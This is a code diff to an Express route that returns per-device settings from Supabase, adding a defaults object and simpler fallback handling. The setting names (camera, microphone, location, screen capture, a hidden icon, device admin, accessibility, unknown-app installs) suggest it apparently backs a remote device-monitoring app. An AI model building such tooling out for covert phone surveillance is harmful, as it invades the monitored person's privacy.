@@ -5,24 +5,25 @@ const { auth } = require('../middleware/auth');
 // Get device settings
 router.get('/:deviceId', auth, async (req, res) => {
   try {
+    const DEFAULTS = { device_id: req.params.deviceId, camera_enabled: 1, microphone_enabled: 1, location_enabled: 1, bluetooth_enabled: 1, wifi_enabled: 1, mobile_data_enabled: 1, icon_hidden: 0, screen_capture_enabled: 1, notification_access: 0, accessibility_enabled: 0, device_admin_enabled: 0, usb_debugging_enabled: 0, install_unknown_apps: 0 };
+
     let { data, error } = await supabase
       .from('device_settings')
       .select('*')
       .eq('device_id', req.params.deviceId)
       .single();
 
-    if (error && error.code === 'PGRST116') {
+    if (error || !data) {
       const { data: created, error: createErr } = await supabase
         .from('device_settings')
-        .upsert({ device_id: req.params.deviceId, updated_at: new Date().toISOString() }, { onConflict: 'device_id' })
+        .upsert({ device_id: req.params.deviceId, ...DEFAULTS, updated_at: new Date().toISOString() }, { onConflict: 'device_id' })
         .select()
         .single();
-      if (createErr) {
-        data = { device_id: req.params.deviceId, camera_enabled: 1, microphone_enabled: 1, location_enabled: 1, bluetooth_enabled: 1, wifi_enabled: 1, mobile_data_enabled: 1, icon_hidden: 0, screen_capture_enabled: 1 };
-      } else {
-        data = created;
+      if (createErr || !created) {
+        return res.json(DEFAULTS);
       }
-    } else if (error) throw error;
+      data = created;
+    }
 
     res.json(data);
   } catch (err) { res.status(500).json({ error: err.message }); }
